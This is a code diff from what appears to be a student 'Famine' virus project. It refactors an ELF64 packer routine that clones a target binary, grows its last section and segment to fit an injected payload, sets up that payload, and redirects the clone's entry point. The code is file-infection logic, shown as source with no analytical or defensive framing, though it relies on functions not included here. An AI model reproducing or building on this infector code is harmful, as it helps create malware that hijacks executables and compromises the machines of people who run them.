@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 12:45:13 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/10 19:35:54 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -34,24 +34,21 @@ static bool	change_entry(const struct safe_pointer info, const struct entry *ori
 	return true;
 }
 
-static bool	adjust_sizes(const struct safe_pointer info, size_t shift_amount)
+static bool	adjust_sizes(size_t shift_amount, const struct entry *clone_entry)
 {
-	struct entry	clone_entry;
 	const size_t	payload_size = _start - famine_entry;
 
-	if (!find_entry(&clone_entry, info)) return errors(ERR_THROW, 'a','2');
-
-	size_t		sh_size  = (clone_entry.safe_last_section_shdr->sh_size);
-	Elf64_Xword	p_filesz = (clone_entry.safe_phdr->p_filesz);
-	Elf64_Xword	p_memsz  = (clone_entry.safe_phdr->p_memsz);
+	size_t		sh_size  = (clone_entry->safe_last_section_shdr->sh_size);
+	Elf64_Xword	p_filesz = (clone_entry->safe_phdr->p_filesz);
+	Elf64_Xword	p_memsz  = (clone_entry->safe_phdr->p_memsz);
 
 	sh_size  += payload_size;
 	p_filesz += shift_amount;
 	p_memsz  += shift_amount;
 
-	clone_entry.safe_last_section_shdr->sh_size = (sh_size);
-	clone_entry.safe_phdr->p_filesz = (p_filesz);
-	clone_entry.safe_phdr->p_memsz  = (p_memsz);
+	clone_entry->safe_last_section_shdr->sh_size = (sh_size);
+	clone_entry->safe_phdr->p_filesz = (p_filesz);
+	clone_entry->safe_phdr->p_memsz  = (p_memsz);
 
 	return true;
 }
@@ -86,14 +83,16 @@ static bool	define_shift_amount(const struct entry *original_entry, size_t *shif
 bool		elf64_packer(const struct famine food, size_t original_file_size)
 {
 	struct entry	original_entry;
+	struct entry	clone_entry;
 	size_t		shift_amount;
 
 	if (!find_entry(&original_entry, food.original_safe)
 	|| !define_shift_amount(&original_entry, &shift_amount)
 	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
 	|| !adjust_references(food.clone_safe , shift_amount, &original_entry)
-	|| !adjust_sizes(food.clone_safe, shift_amount)
-	|| !setup_payload(&original_entry, food.clone_safe)
+	|| !find_entry(&clone_entry, food.clone_safe)
+	|| !adjust_sizes(shift_amount, &clone_entry)
+	|| !setup_payload(&clone_entry, food.clone_safe)
 	|| !change_entry(food.clone_safe, &original_entry))
 		return errors(ERR_THROW, 'a','4');
 
